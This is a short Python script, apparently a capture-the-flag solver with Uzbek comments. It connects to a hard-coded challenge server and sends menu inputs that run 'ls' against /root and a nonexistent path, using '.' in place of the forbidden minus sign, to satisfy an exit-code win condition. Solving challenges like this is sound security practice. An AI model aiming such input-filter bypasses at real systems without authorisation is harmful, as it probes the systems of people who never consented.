import socket
import time

def solve():
    host = '154.57.164.68'
    port = 31363

    # Serverga ulanish
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    
    try:
        print(f"[*] Connecting to {host}:{port}...")
        s.connect((host, port))
        
        def send_payload(data):
            s.sendall(data.encode() + b'\n')
            time.sleep(0.5) # Serverga qabul qilish uchun vaqt beramiz

        # 1-qadam: Mode -1
        send_payload("1")
        send_payload("-1")

        # 2-qadam: Bin (ls yoki cat - ikkalasi ham 2-3 harf)
        send_payload("2")
        send_payload("ls")

        # 3-qadam: Argumentlar (turli exit kodlar olish uchun)
        # Maqsad: rc=1 va rc=2
        # 'ls .' (rc=0), 'ls /root' (rc=2/1), 'ls /nonexistent' (rc=2)
        send_payload("3")
        send_payload("/root,/nonexistent")

        # 4-qadam: Switchlar (minus taqiqlangan, shuning uchun nuqta)
        send_payload("4")
        send_payload(".,.")

        # 5-qadam: G'alaba shartini tekshirish
        send_payload("5")

        # Natijani kutish va chop etish
        time.sleep(2)
        response = s.recv(4096).decode()
        print("[+] Server Response:")
        print(response)

    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    solve()
